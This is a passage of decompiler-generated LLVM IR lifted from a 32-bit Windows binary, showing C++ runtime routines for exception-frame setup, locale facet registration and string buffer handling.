  ret i32 ptrtoint (i32* @global_var_1003df80 to i32), !insn.addr !3626
}

define i32 @function_10006af0(i32 %arg1) local_unnamed_addr {
dec_label_pc_10006af0:
  %esp.0.reg2mem = alloca i32, !insn.addr !3627
  %eax.0.reg2mem = alloca i32, !insn.addr !3627
  %0 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %1 = call i32 @__readfsdword(i32 0), !insn.addr !3628
  store i32 %1, i32* %stack_var_-16, align 4, !insn.addr !3629
  %2 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !3630
  call void @__writefsdword(i32 0, i32 %2), !insn.addr !3631
  %3 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !3632
  store i32 %3, i32* %stack_var_-40, align 4, !insn.addr !3633
  store i32 %3, i32* %stack_var_-44, align 4, !insn.addr !3634
  %4 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !3635
  %5 = icmp eq i32 %0, 0, !insn.addr !3636
  store i32 %3, i32* %eax.0.reg2mem, !insn.addr !3637
  store i32 %4, i32* %esp.0.reg2mem, !insn.addr !3637
  br i1 %5, label %dec_label_pc_10006b5b, label %dec_label_pc_10006b4a, !insn.addr !3637

dec_label_pc_10006b4a:                            ; preds = %dec_label_pc_10006af0
  %6 = inttoptr i32 %0 to i32*, !insn.addr !3638
  %7 = load i32, i32* %6, align 4, !insn.addr !3638
  %8 = icmp eq i32 %7, 0, !insn.addr !3639
  store i32 0, i32* %eax.0.reg2mem, !insn.addr !3640
  store i32 %4, i32* %esp.0.reg2mem, !insn.addr !3640
  br i1 %8, label %dec_label_pc_10006b5b, label %dec_label_pc_10006b53, !insn.addr !3640

dec_label_pc_10006b53:                            ; preds = %dec_label_pc_10006b4a
  store i32 1, i32* %stack_var_-44, align 4, !insn.addr !3641
  %9 = ptrtoint i32* %stack_var_-44 to i32, !insn.addr !3641
  store i32 %7, i32* %eax.0.reg2mem, !insn.addr !3642
  store i32 %9, i32* %esp.0.reg2mem, !insn.addr !3642
  br label %dec_label_pc_10006b5b, !insn.addr !3642

dec_label_pc_10006b5b:                            ; preds = %dec_label_pc_10006b53, %dec_label_pc_10006b4a, %dec_label_pc_10006af0
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %10 = add i32 %esp.0.reload, -4, !insn.addr !3643
  %11 = inttoptr i32 %10 to i32*, !insn.addr !3643
  store i32 10, i32* %11, align 4, !insn.addr !3643
  %12 = and i32 %eax.0.reload, 255, !insn.addr !3644
  %13 = add i32 %esp.0.reload, -8, !insn.addr !3645
  %14 = inttoptr i32 %13 to i32*, !insn.addr !3645
  store i32 %12, i32* %14, align 4, !insn.addr !3645
  %15 = load i32, i32* %stack_var_-44, align 4, !insn.addr !3646
  %16 = load i32, i32* %stack_var_-40, align 4, !insn.addr !3646
  %17 = inttoptr i32 %16 to i32*, !insn.addr !3646
  %18 = call i32 @function_10007000(i32 %15, i32* %17), !insn.addr !3646
  %19 = load i32, i32* %stack_var_-16, align 4, !insn.addr !3647
  call void @__writefsdword(i32 0, i32 %19), !insn.addr !3648
  ret i32 %arg1, !insn.addr !3649
}

define i32 @function_10006ba0(i32 %arg1) local_unnamed_addr {
dec_label_pc_10006ba0:
  %esp.0.reg2mem = alloca i32, !insn.addr !3650
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %2 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !3651
  %3 = call i32 @__readfsdword(i32 0), !insn.addr !3652
  store i32 %3, i32* %stack_var_-16, align 4, !insn.addr !3653
  %4 = load i32, i32* @global_var_1003d070, align 4, !insn.addr !3654
  %5 = xor i32 %4, %2, !insn.addr !3655
  store i32 %5, i32* %stack_var_-40, align 4, !insn.addr !3656
  %6 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !3656
  %7 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !3657
  call void @__writefsdword(i32 0, i32 %7), !insn.addr !3658
  %8 = add i32 %1, 16, !insn.addr !3659
  %9 = inttoptr i32 %8 to i32*, !insn.addr !3659
  store i32 0, i32* %9, align 4, !insn.addr !3659
  %10 = add i32 %1, 20, !insn.addr !3660
  %11 = inttoptr i32 %10 to i32*, !insn.addr !3660
  store i32 15, i32* %11, align 4, !insn.addr !3660
  %12 = inttoptr i32 %1 to i8*, !insn.addr !3661
  store i8 0, i8* %12, align 1, !insn.addr !3661
  %13 = add i32 %0, 16, !insn.addr !3662
  %14 = inttoptr i32 %13 to i32*, !insn.addr !3662
  %15 = load i32, i32* %14, align 4, !insn.addr !3662
  %16 = load i32, i32* %9, align 4, !insn.addr !3663
  %17 = add i32 %arg1, 16, !insn.addr !3664
  %18 = inttoptr i32 %17 to i32*, !insn.addr !3664
  %19 = load i32, i32* %18, align 4, !insn.addr !3664
  %20 = add i32 %19, %15, !insn.addr !3664
  %21 = icmp ugt i32 %16, %20
  store i32 %6, i32* %esp.0.reg2mem, !insn.addr !3665
  br i1 %21, label %dec_label_pc_10006c46, label %dec_label_pc_10006c05, !insn.addr !3665

dec_label_pc_10006c05:                            ; preds = %dec_label_pc_10006ba0
  %22 = load i32, i32* %11, align 4, !insn.addr !3666
  %23 = icmp eq i32 %22, %20, !insn.addr !3667
  store i32 %6, i32* %esp.0.reg2mem, !insn.addr !3668
  br i1 %23, label %dec_label_pc_10006c46, label %dec_label_pc_10006c0c, !insn.addr !3668

dec_label_pc_10006c0c:                            ; preds = %dec_label_pc_10006c05
  %24 = icmp ult i32 %22, %20, !insn.addr !3667
  %25 = icmp eq i1 %24, false, !insn.addr !3669
  br i1 %25, label %dec_label_pc_10006c18, label %dec_label_pc_10006c0e, !insn.addr !3669

dec_label_pc_10006c0e:                            ; preds = %dec_label_pc_10006c0c
  store i32 %20, i32* %stack_var_-44, align 4, !insn.addr !3670
  %26 = ptrtoint i32* %stack_var_-44 to i32, !insn.addr !3670
  %27 = call i32 @function_10005f40(i32 %20, i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32)), !insn.addr !3671
  store i32 %26, i32* %esp.0.reg2mem, !insn.addr !3672
  br label %dec_label_pc_10006c46, !insn.addr !3672

dec_label_pc_10006c18:                            ; preds = %dec_label_pc_10006c0c
  %28 = icmp ult i32 %20, 16, !insn.addr !3673
  %29 = icmp eq i1 %28, false, !insn.addr !3674
  %30 = icmp ult i32 %22, 16, !insn.addr !3675
  %or.cond = or i1 %29, %30
  store i32 %6, i32* %esp.0.reg2mem, !insn.addr !3674
  br i1 %or.cond, label %dec_label_pc_10006c46, label %dec_label_pc_10006c22, !insn.addr !3674

dec_label_pc_10006c22:                            ; preds = %dec_label_pc_10006c18
  %31 = add i32 %16, 1, !insn.addr !3676
  store i32 %31, i32* %stack_var_-44, align 4, !insn.addr !3677
  store i32 %22, i32* %stack_var_-48, align 4, !insn.addr !3678
  %32 = call i32 @_memcpy.12(), !insn.addr !3679
  %33 = load i32, i32* %11, align 4, !insn.addr !3680
  %34 = add i32 %33, 1, !insn.addr !3681
  store i32 %34, i32* %stack_var_-44, align 4, !insn.addr !3682
  store i32 %22, i32* %stack_var_-48, align 4, !insn.addr !3683
  %35 = ptrtoint i32* %stack_var_-48 to i32, !insn.addr !3683
  %36 = call i32 @function_10005ee0(i32 %22, i32 %34), !insn.addr !3684
  store i32 15, i32* %11, align 4, !insn.addr !3685
  store i32 %35, i32* %esp.0.reg2mem, !insn.addr !3685
  br label %dec_label_pc_10006c46, !insn.addr !3685

dec_label_pc_10006c46:                            ; preds = %dec_label_pc_10006ba0, %dec_label_pc_10006c22, %dec_label_pc_10006c18, %dec_label_pc_10006c0e, %dec_label_pc_10006c05
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %37 = add i32 %esp.0.reload, -4, !insn.addr !3686
  %38 = inttoptr i32 %37 to i32*, !insn.addr !3686
  store i32 -1, i32* %38, align 4, !insn.addr !3686
  %39 = add i32 %esp.0.reload, -8, !insn.addr !3687
  %40 = inttoptr i32 %39 to i32*, !insn.addr !3687
  store i32 0, i32* %40, align 4, !insn.addr !3687
  %41 = add i32 %esp.0.reload, -12, !insn.addr !3688
  %42 = inttoptr i32 %41 to i32*, !insn.addr !3688
  %43 = call i32 @function_100051f0(i8 ptrtoint (i32* @1 to i8), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32)), !insn.addr !3689
  %44 = add i32 %esp.0.reload, -16, !insn.addr !3690
  %45 = inttoptr i32 %44 to i32*, !insn.addr !3690
  store i32 -1, i32* %45, align 4, !insn.addr !3690
  %46 = add i32 %esp.0.reload, -20, !insn.addr !3691
  %47 = inttoptr i32 %46 to i32*, !insn.addr !3691
  store i32 0, i32* %47, align 4, !insn.addr !3691
  %48 = add i32 %esp.0.reload, -24, !insn.addr !3692
  %49 = inttoptr i32 %48 to i32*, !insn.addr !3692
  store i32 %arg1, i32* %49, align 4, !insn.addr !3692
  %50 = call i32 @function_100051f0(i8 ptrtoint (i32* @1 to i8), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32)), !insn.addr !3693
  %51 = load i32, i32* %stack_var_-16, align 4, !insn.addr !3694
  call void @__writefsdword(i32 0, i32 %51), !insn.addr !3695
  ret i32 %1, !insn.addr !3696
}

define i32 @function_10006c80(i32* %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_10006c80:
  %esi.2.reg2mem = alloca i32, !insn.addr !3697
  %eax.0.reg2mem = alloca i32, !insn.addr !3697
  %esi.1.reg2mem = alloca i32, !insn.addr !3697
  %esi.0.reg2mem = alloca i32, !insn.addr !3697
  %edi.0.reg2mem = alloca i32, !insn.addr !3697
  %esp.0.in.reg2mem = alloca i32*, !insn.addr !3697
  %stack_var_-20 = alloca i8*, align 4
  %stack_var_-100 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !3698
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !3699
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !3700
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !3701
  store i32 0, i32* %stack_var_-96, align 4, !insn.addr !3702
  %2 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !3703
  store i32 0, i32* %stack_var_-24, align 4, !insn.addr !3704
  %3 = call i32 @"??0_Lockit@std@@QAE@H@Z"(i32 %2), !insn.addr !3705
  %4 = load i32, i32* @global_var_10040a44, align 4, !insn.addr !3706
  %5 = load i32, i32* @global_var_10040a3c, align 4, !insn.addr !3707
  %6 = icmp eq i32 %4, 0, !insn.addr !3708
  %7 = icmp eq i1 %6, false, !insn.addr !3709
  store i32* %stack_var_-96, i32** %esp.0.in.reg2mem, !insn.addr !3709
  store i32 %4, i32* %edi.0.reg2mem, !insn.addr !3709
  br i1 %7, label %dec_label_pc_10006cff, label %dec_label_pc_10006cd0, !insn.addr !3709

dec_label_pc_10006cd0:                            ; preds = %dec_label_pc_10006c80
  store i32 %4, i32* %stack_var_-100, align 4, !insn.addr !3710
  %8 = ptrtoint i8** %stack_var_-20 to i32, !insn.addr !3711
  %9 = call i32 @"??0_Lockit@std@@QAE@H@Z"(i32 %8), !insn.addr !3712
  %10 = load i32, i32* @global_var_10040a44, align 4, !insn.addr !3713
  %11 = icmp eq i32 %10, %4, !insn.addr !3713
  %12 = icmp eq i1 %11, false, !insn.addr !3714
  br i1 %12, label %dec_label_pc_10006cf1, label %dec_label_pc_10006ce1, !insn.addr !3714

dec_label_pc_10006ce1:                            ; preds = %dec_label_pc_10006cd0
  %13 = load i32, i32* @global_var_1003e03c, align 4, !insn.addr !3715
  %14 = add i32 %13, 1, !insn.addr !3716
  store i32 %14, i32* @global_var_1003e03c, align 4, !insn.addr !3717
  store i32 %14, i32* @global_var_10040a44, align 4, !insn.addr !3718
  br label %dec_label_pc_10006cf1, !insn.addr !3718

dec_label_pc_10006cf1:                            ; preds = %dec_label_pc_10006ce1, %dec_label_pc_10006cd0
  %15 = call i32 @"??1_Lockit@std@@QAE@XZ"(), !insn.addr !3719
  %16 = load i32, i32* @global_var_10040a44, align 4, !insn.addr !3720
  store i32* %stack_var_-100, i32** %esp.0.in.reg2mem, !insn.addr !3720
  store i32 %16, i32* %edi.0.reg2mem, !insn.addr !3720
  br label %dec_label_pc_10006cff, !insn.addr !3720

dec_label_pc_10006cff:                            ; preds = %dec_label_pc_10006cf1, %dec_label_pc_10006c80
  %17 = ptrtoint i32* %arg1 to i32
  %edi.0.reload = load i32, i32* %edi.0.reg2mem
  %esp.0.in.reload = load i32*, i32** %esp.0.in.reg2mem
  %18 = add i32 %17, 4, !insn.addr !3721
  %19 = inttoptr i32 %18 to i32*, !insn.addr !3721
  %20 = load i32, i32* %19, align 4, !insn.addr !3721
  %21 = add i32 %20, 12, !insn.addr !3722
  %22 = inttoptr i32 %21 to i32*, !insn.addr !3722
  %23 = load i32, i32* %22, align 4, !insn.addr !3722
  %24 = icmp ult i32 %edi.0.reload, %23, !insn.addr !3722
  %25 = icmp eq i1 %24, false, !insn.addr !3723
  store i32 0, i32* %esi.0.reg2mem, !insn.addr !3723
  br i1 %25, label %dec_label_pc_10006d1c, label %dec_label_pc_10006d0a, !insn.addr !3723

dec_label_pc_10006d0a:                            ; preds = %dec_label_pc_10006cff
  %26 = add i32 %20, 8, !insn.addr !3724
  %27 = inttoptr i32 %26 to i32*, !insn.addr !3724
  %28 = load i32, i32* %27, align 4, !insn.addr !3724
  %29 = mul i32 %edi.0.reload, 4, !insn.addr !3725
  %30 = add i32 %28, %29, !insn.addr !3725
  %31 = inttoptr i32 %30 to i32*, !insn.addr !3725
  %32 = load i32, i32* %31, align 4, !insn.addr !3725
  %33 = icmp eq i32 %32, 0, !insn.addr !3726
  %34 = icmp eq i1 %33, false, !insn.addr !3727
  store i32 %32, i32* %esi.0.reg2mem, !insn.addr !3727
  store i32 %32, i32* %esi.2.reg2mem, !insn.addr !3727
  br i1 %34, label %dec_label_pc_10006da4, label %dec_label_pc_10006d1c, !insn.addr !3727

dec_label_pc_10006d1c:                            ; preds = %dec_label_pc_10006cff, %dec_label_pc_10006d0a
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %35 = add i32 %20, 20, !insn.addr !3728
  %36 = inttoptr i32 %35 to i8*, !insn.addr !3728
  %37 = load i8, i8* %36, align 1, !insn.addr !3728
  %38 = icmp eq i8 %37, 0, !insn.addr !3728
  store i32 %esi.0.reload, i32* %esi.1.reg2mem, !insn.addr !3729
  br i1 %38, label %dec_label_pc_10006d32, label %dec_label_pc_10006d22, !insn.addr !3729

dec_label_pc_10006d22:                            ; preds = %dec_label_pc_10006d1c
  %39 = call i32 @function_1000e50f(), !insn.addr !3730
  %40 = add i32 %39, 12, !insn.addr !3731
  %41 = inttoptr i32 %40 to i32*, !insn.addr !3731
  %42 = load i32, i32* %41, align 4, !insn.addr !3731
  %43 = icmp ult i32 %edi.0.reload, %42, !insn.addr !3731
  %44 = icmp eq i1 %43, false, !insn.addr !3732
  br i1 %44, label %dec_label_pc_10006d36, label %dec_label_pc_10006d2c, !insn.addr !3732

dec_label_pc_10006d2c:                            ; preds = %dec_label_pc_10006d22
  %45 = add i32 %39, 8, !insn.addr !3733
  %46 = inttoptr i32 %45 to i32*, !insn.addr !3733
  %47 = load i32, i32* %46, align 4, !insn.addr !3733
  %48 = mul i32 %edi.0.reload, 4, !insn.addr !3734
  %49 = add i32 %47, %48, !insn.addr !3734
  %50 = inttoptr i32 %49 to i32*, !insn.addr !3734
  %51 = load i32, i32* %50, align 4, !insn.addr !3734
  store i32 %51, i32* %esi.1.reg2mem, !insn.addr !3734
  br label %dec_label_pc_10006d32, !insn.addr !3734

dec_label_pc_10006d32:                            ; preds = %dec_label_pc_10006d2c, %dec_label_pc_10006d1c
  %esi.1.reload = load i32, i32* %esi.1.reg2mem
  %52 = icmp eq i32 %esi.1.reload, 0, !insn.addr !3735
  %53 = icmp eq i1 %52, false, !insn.addr !3736
  store i32 %esi.1.reload, i32* %esi.2.reg2mem, !insn.addr !3736
  br i1 %53, label %dec_label_pc_10006da4, label %dec_label_pc_10006d36, !insn.addr !3736

dec_label_pc_10006d36:                            ; preds = %dec_label_pc_10006d32, %dec_label_pc_10006d22
  %54 = icmp eq i32 %5, 0, !insn.addr !3737
  store i32 %5, i32* %esi.2.reg2mem, !insn.addr !3738
  br i1 %54, label %dec_label_pc_10006d3e, label %dec_label_pc_10006da4, !insn.addr !3738

dec_label_pc_10006d3e:                            ; preds = %dec_label_pc_10006d36
  %esp.0 = ptrtoint i32* %esp.0.in.reload to i32
  %55 = add i32 %esp.0, -4, !insn.addr !3739
  %56 = inttoptr i32 %55 to i32*, !insn.addr !3739
  store i32 8, i32* %56, align 4, !insn.addr !3739
  %57 = call i32 @"??2@YAPAXI@Z"(i32 ptrtoint (i32* @1 to i32)), !insn.addr !3740
  %58 = inttoptr i32 %57 to i8*, !insn.addr !3741
  store i8* %58, i8** %stack_var_-20, align 4, !insn.addr !3741
  %59 = load i32, i32* %19, align 4, !insn.addr !3742
  %60 = icmp eq i32 %59, 0, !insn.addr !3743
  %61 = icmp eq i1 %60, false, !insn.addr !3744
  store i32 ptrtoint (i8** @global_var_10039150 to i32), i32* %eax.0.reg2mem, !insn.addr !3744
  br i1 %61, label %dec_label_pc_10006d62, label %dec_label_pc_10006d6c, !insn.addr !3744

dec_label_pc_10006d62:                            ; preds = %dec_label_pc_10006d3e
  %62 = add i32 %59, 24, !insn.addr !3745
  %63 = inttoptr i32 %62 to i32*, !insn.addr !3745
  %64 = load i32, i32* %63, align 4, !insn.addr !3745
  %65 = icmp eq i32 %64, 0, !insn.addr !3746
  %66 = icmp eq i1 %65, false, !insn.addr !3747
  %67 = add i32 %59, 28
  %spec.select = select i1 %66, i32 %64, i32 %67
  store i32 %spec.select, i32* %eax.0.reg2mem
  br label %dec_label_pc_10006d6c

dec_label_pc_10006d6c:                            ; preds = %dec_label_pc_10006d62, %dec_label_pc_10006d3e
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  store i32 %eax.0.reload, i32* %56, align 4, !insn.addr !3748
  %68 = load i8*, i8** %stack_var_-20, align 4, !insn.addr !3749
  %69 = call i32 @"??0_Locinfo@std@@QAE@PBD@Z"(i32* nonnull %stack_var_-76, i8* %68), !insn.addr !3749
  %70 = add i32 %57, 4, !insn.addr !3750
  %71 = inttoptr i32 %70 to i32*, !insn.addr !3750
  store i32 0, i32* %71, align 4, !insn.addr !3750
  %72 = inttoptr i32 %57 to i32*, !insn.addr !3751
  store i32 ptrtoint (%vtable_1002dfbc_type* @global_var_1002dfbc to i32), i32* %72, align 4, !insn.addr !3751
  %73 = call i32 @"??1_Locinfo@std@@QAE@XZ"(), !insn.addr !3752
  store i32 %57, i32* @global_var_10040a3c, align 4, !insn.addr !3753
  %74 = add i32 %esp.0, -8, !insn.addr !3754
  %75 = inttoptr i32 %74 to i32*, !insn.addr !3754
  store i32 %57, i32* %75, align 4, !insn.addr !3754
  %76 = call i32 @"?_Facet_Register@std@@YAXPAV_Facet_base@1@@Z"(i32* nonnull @1), !insn.addr !3755
  store i32 %57, i32* %esi.2.reg2mem, !insn.addr !3756
  br label %dec_label_pc_10006da4, !insn.addr !3756

dec_label_pc_10006da4:                            ; preds = %dec_label_pc_10006d36, %dec_label_pc_10006d6c, %dec_label_pc_10006d32, %dec_label_pc_10006d0a
  %esi.2.reload = load i32, i32* %esi.2.reg2mem
  %77 = call i32 @"??1_Lockit@std@@QAE@XZ"(), !insn.addr !3757
  %78 = load i32, i32* %stack_var_-16, align 4, !insn.addr !3758
  call void @__writefsdword(i32 0, i32 %78), !insn.addr !3759
  ret i32 %esi.2.reload, !insn.addr !3760
}

define i32 @function_10006dc0(i32* %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_10006dc0:
  %esi.2.reg2mem = alloca i32, !insn.addr !3761
  %.pre-phi2.reg2mem = alloca i32*, !insn.addr !3761
  %esi.1.reg2mem = alloca i32, !insn.addr !3761
  %esi.0.reg2mem = alloca i32, !insn.addr !3761
  %edi.0.reg2mem = alloca i32, !insn.addr !3761
  %esp.0.in.reg2mem = alloca i32*, !insn.addr !3761
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !3762
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !3763
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !3764
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !3765
  store i32 0, i32* %stack_var_-60, align 4, !insn.addr !3766
  %2 = ptrtoint i32* %stack_var_-28 to i32, !insn.addr !3767
  %3 = call i32 @"??0_Lockit@std@@QAE@H@Z"(i32 %2), !insn.addr !3768
  %4 = load i32, i32* @global_var_10040a54, align 4, !insn.addr !3769
  %5 = load i32, i32* @global_var_10040a38, align 4, !insn.addr !3770
  store i32 %5, i32* %stack_var_-20, align 4, !insn.addr !3771
  %6 = icmp eq i32 %4, 0, !insn.addr !3772
  %7 = icmp eq i1 %6, false, !insn.addr !3773
  store i32* %stack_var_-60, i32** %esp.0.in.reg2mem, !insn.addr !3773
  store i32 %4, i32* %edi.0.reg2mem, !insn.addr !3773
  br i1 %7, label %dec_label_pc_10006e3b, label %dec_label_pc_10006e0c, !insn.addr !3773

dec_label_pc_10006e0c:                            ; preds = %dec_label_pc_10006dc0
  store i32 %4, i32* %stack_var_-64, align 4, !insn.addr !3774
  %8 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !3775
  %9 = call i32 @"??0_Lockit@std@@QAE@H@Z"(i32 %8), !insn.addr !3776
  %10 = load i32, i32* @global_var_10040a54, align 4, !insn.addr !3777
  %11 = icmp eq i32 %10, %4, !insn.addr !3777
  %12 = icmp eq i1 %11, false, !insn.addr !3778
  br i1 %12, label %dec_label_pc_10006e2d, label %dec_label_pc_10006e1d, !insn.addr !3778

dec_label_pc_10006e1d:                            ; preds = %dec_label_pc_10006e0c
  %13 = load i32, i32* @global_var_1003e03c, align 4, !insn.addr !3779
  %14 = add i32 %13, 1, !insn.addr !3780
  store i32 %14, i32* @global_var_1003e03c, align 4, !insn.addr !3781
  store i32 %14, i32* @global_var_10040a54, align 4, !insn.addr !3782
  br label %dec_label_pc_10006e2d, !insn.addr !3782

dec_label_pc_10006e2d:                            ; preds = %dec_label_pc_10006e1d, %dec_label_pc_10006e0c
  %15 = call i32 @"??1_Lockit@std@@QAE@XZ"(), !insn.addr !3783
  %16 = load i32, i32* @global_var_10040a54, align 4, !insn.addr !3784
  store i32* %stack_var_-64, i32** %esp.0.in.reg2mem, !insn.addr !3784
  store i32 %16, i32* %edi.0.reg2mem, !insn.addr !3784
  br label %dec_label_pc_10006e3b, !insn.addr !3784

dec_label_pc_10006e3b:                            ; preds = %dec_label_pc_10006e2d, %dec_label_pc_10006dc0
  %17 = ptrtoint i32* %arg1 to i32
  %edi.0.reload = load i32, i32* %edi.0.reg2mem
  %esp.0.in.reload = load i32*, i32** %esp.0.in.reg2mem
  %18 = add i32 %17, 4, !insn.addr !3785
  %19 = inttoptr i32 %18 to i32*, !insn.addr !3785
  %20 = load i32, i32* %19, align 4, !insn.addr !3785
  %21 = add i32 %20, 12, !insn.addr !3786
  %22 = inttoptr i32 %21 to i32*, !insn.addr !3786
  %23 = load i32, i32* %22, align 4, !insn.addr !3786
  %24 = icmp ult i32 %edi.0.reload, %23, !insn.addr !3786
  %25 = icmp eq i1 %24, false, !insn.addr !3787
  store i32 0, i32* %esi.0.reg2mem, !insn.addr !3787
  br i1 %25, label %dec_label_pc_10006e54, label %dec_label_pc_10006e46, !insn.addr !3787

dec_label_pc_10006e46:                            ; preds = %dec_label_pc_10006e3b
  %26 = add i32 %20, 8, !insn.addr !3788
  %27 = inttoptr i32 %26 to i32*, !insn.addr !3788
  %28 = load i32, i32* %27, align 4, !insn.addr !3788
  %29 = mul i32 %edi.0.reload, 4, !insn.addr !3789
  %30 = add i32 %28, %29, !insn.addr !3789
  %31 = inttoptr i32 %30 to i32*, !insn.addr !3789
  %32 = load i32, i32* %31, align 4, !insn.addr !3789
  %33 = icmp eq i32 %32, 0, !insn.addr !3790
  %34 = icmp eq i1 %33, false, !insn.addr !3791
  store i32 %32, i32* %esi.0.reg2mem, !insn.addr !3791
  store i32 %32, i32* %esi.2.reg2mem, !insn.addr !3791
  br i1 %34, label %dec_label_pc_10006eb9, label %dec_label_pc_10006e54, !insn.addr !3791

dec_label_pc_10006e54:                            ; preds = %dec_label_pc_10006e3b, %dec_label_pc_10006e46
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %35 = add i32 %20, 20, !insn.addr !3792
  %36 = inttoptr i32 %35 to i8*, !insn.addr !3792
  %37 = load i8, i8* %36, align 1, !insn.addr !3792
  %38 = icmp eq i8 %37, 0, !insn.addr !3792
  store i32 %esi.0.reload, i32* %esi.1.reg2mem, !insn.addr !3793
  br i1 %38, label %dec_label_pc_10006e6a, label %dec_label_pc_10006e5a, !insn.addr !3793

dec_label_pc_10006e5a:                            ; preds = %dec_label_pc_10006e54
  %39 = call i32 @function_1000e50f(), !insn.addr !3794
  %40 = add i32 %39, 12, !insn.addr !3795
  %41 = inttoptr i32 %40 to i32*, !insn.addr !3795
  %42 = load i32, i32* %41, align 4, !insn.addr !3795
  %43 = icmp ult i32 %edi.0.reload, %42, !insn.addr !3795
  %44 = icmp eq i1 %43, false, !insn.addr !3796
  br i1 %44, label %dec_label_pc_10006e6e, label %dec_label_pc_10006e64, !insn.addr !3796

dec_label_pc_10006e64:                            ; preds = %dec_label_pc_10006e5a
  %45 = add i32 %39, 8, !insn.addr !3797
  %46 = inttoptr i32 %45 to i32*, !insn.addr !3797
  %47 = load i32, i32* %46, align 4, !insn.addr !3797
  %48 = mul i32 %edi.0.reload, 4, !insn.addr !3798
  %49 = add i32 %47, %48, !insn.addr !3798
  %50 = inttoptr i32 %49 to i32*, !insn.addr !3798
  %51 = load i32, i32* %50, align 4, !insn.addr !3798
  store i32 %51, i32* %esi.1.reg2mem, !insn.addr !3798
  br label %dec_label_pc_10006e6a, !insn.addr !3798

dec_label_pc_10006e6a:                            ; preds = %dec_label_pc_10006e64, %dec_label_pc_10006e54
  %esi.1.reload = load i32, i32* %esi.1.reg2mem
  %52 = icmp eq i32 %esi.1.reload, 0, !insn.addr !3799
  %53 = icmp eq i1 %52, false, !insn.addr !3800
  store i32 %esi.1.reload, i32* %esi.2.reg2mem, !insn.addr !3800
  br i1 %53, label %dec_label_pc_10006eb9, label %dec_label_pc_10006e6e, !insn.addr !3800

dec_label_pc_10006e6e:                            ; preds = %dec_label_pc_10006e6a, %dec_label_pc_10006e5a
  %54 = icmp eq i32 %5, 0, !insn.addr !3801
  store i32 %5, i32* %esi.2.reg2mem, !insn.addr !3802
  br i1 %54, label %dec_label_pc_10006e76, label %dec_label_pc_10006eb9, !insn.addr !3802

dec_label_pc_10006e76:                            ; preds = %dec_label_pc_10006e6e
  %esp.0 = ptrtoint i32* %esp.0.in.reload to i32
  %55 = add i32 %esp.0, -4
  %56 = inttoptr i32 %55 to i32*
  store i32 %17, i32* %56, align 4, !insn.addr !3803
  %57 = add i32 %esp.0, -8, !insn.addr !3804
  %58 = inttoptr i32 %57 to i32*, !insn.addr !3804
  %59 = ptrtoint i32* %stack_var_-20 to i32, !insn.addr !3804
  store i32 %59, i32* %58, align 4, !insn.addr !3804
  %60 = call i32 @function_10006f30(i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32)), !insn.addr !3805
  %61 = icmp eq i32 %60, -1, !insn.addr !3806
  %62 = icmp eq i1 %61, false, !insn.addr !3807
  store i32* %56, i32** %.pre-phi2.reg2mem, !insn.addr !3807
  br i1 %62, label %dec_label_pc_10006ea0, label %dec_label_pc_10006e8a, !insn.addr !3807

dec_label_pc_10006e8a:                            ; preds = %dec_label_pc_10006e76
  %63 = call i32 @"??0bad_cast@std@@QAE@XZ"(), !insn.addr !3808
  store i32 ptrtoint (i32* @global_var_1003bdd0 to i32), i32* %56, align 4, !insn.addr !3809
  %64 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !3810
  store i32 %64, i32* %58, align 4, !insn.addr !3810
  %65 = call i32 @"__CxxThrowException@8"(), !insn.addr !3811
  %.pre = add i32 %esp.0, -12, !insn.addr !3812
  %.pre1 = inttoptr i32 %.pre to i32*, !insn.addr !3812
  store i32* %.pre1, i32** %.pre-phi2.reg2mem, !insn.addr !3811
  br label %dec_label_pc_10006ea0, !insn.addr !3811

dec_label_pc_10006ea0:                            ; preds = %dec_label_pc_10006e8a, %dec_label_pc_10006e76
  %.pre-phi2.reload = load i32*, i32** %.pre-phi2.reg2mem
  %66 = load i32, i32* %stack_var_-20, align 4, !insn.addr !3813
  store i32 %66, i32* @global_var_10040a38, align 4, !insn.addr !3814
